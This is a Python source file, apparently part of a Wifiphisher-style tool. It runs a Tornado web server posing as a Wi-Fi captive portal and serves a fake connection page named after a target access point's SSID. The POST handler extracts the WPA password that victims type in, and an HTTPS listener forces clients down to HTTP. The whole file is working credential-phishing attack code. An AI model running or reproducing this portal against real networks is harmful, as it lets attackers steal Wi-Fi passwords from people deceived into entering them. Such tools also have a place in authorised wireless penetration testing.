#!/usr/bin/python
# encoding: utf-8  
"""
@author: Alfons
@contact: alfons_xh@163.com
@file: WifiphisherHTTPServer.py 
@time: 17-6-23 上午11:02 
@version: v1.0 
"""

import tornado.ioloop
import tornado.web
import tornado.httpserver
import time
import threading

AP_SSID = ''
terminate = False

template_directory = '/.ygprog/wifilz/wifiphisher/wifiphisherpages/wifi_connect'
PEM = '/.ygprog/wifilz/wifiphisher/cert/server.pem'

password = ''
password_flag = 'wfphshr-wpa-password='


class DowngradeToHTTP(tornado.web.RequestHandler):

    def get(self):
        """
        重定向HTTPS方法至HTTP
        """
        self.redirect("http://192.168.144.1:8080/")


class CaptivePortalHandler(tornado.web.RequestHandler):

    def get(self):
        """
        用作客户端get显示
        """
        file_path = template_directory + "/index.html"
        self.render(file_path, target_ap_essid=AP_SSID, APs=[])

    def post(self):
        """
        用作客户端post显示
        """
        global terminate
        global password
        post_data = tornado.escape.url_unescape(self.request.body)
        if password_flag in post_data:
            password = post_data[post_data.find(password_flag) + len(password_flag):]
            if password:
                terminate = True
        time.sleep(0.5)

        # TODO:需重新导入失败和成功页面
        file_path = template_directory + "/index.html"
        self.render(file_path, target_ap_essid=AP_SSID, APs=[])


class WifiphisherHTTPServer(threading.Thread):
    def __init__(self):
        """
        初始化程序
        """
        threading.Thread.__init__(self, name='WifiphisherHTTPServer')
        self.__ip = None
        self.__port = None
        self.__ssl_port = None
        self.__http_listener = None
        self.__ssl_listener  = None

    def StartHTTPServer(self, ip, port, ssl_port, ssid):
        """
        启动Wifiphisher的HTTP服务器
        :param ip: 监听的ip地址
        :param port: 监听的http服务端口
        :param ssl_port: 监听的https服务端口
        :param ssid: 目标AP的ssid
        """
        global AP_SSID
        AP_SSID = ssid

        self.__ip = ip
        self.__port = port
        self.__ssl_port = ssl_port

        self.start()

    def StopHTTPServer(self):
        """
        结束web服务
        """
        self.__http_listener.stop()
        self.__ssl_listener.stop()
        tornado.ioloop.IOLoop.instance().stop()

    def run(self):
        """

        :return:
        """
        # 启动HTTP监听
        app = tornado.web.Application(
            [
                (r"/.*", CaptivePortalHandler)
            ],
            template_path=template_directory,
            static_path=template_directory + '/static/',
            compiled_template_cache=False
        )
        self.__http_listener = app.listen(self.__port, address=self.__ip)

        # 启动HTTPS监听
        ssl_app = tornado.web.Application(
            [
                (r"/.*", DowngradeToHTTP)
            ]
        )
        self.__ssl_listener = tornado.httpserver.HTTPServer(ssl_app, ssl_options={
            "certfile": PEM,
            "keyfile": PEM,
        })
        self.__ssl_listener.listen(self.__ssl_port, address=self.__ip)

        # 开启web服务
        tornado.ioloop.IOLoop.instance().start()

        while True:
            time.sleep(0.5)
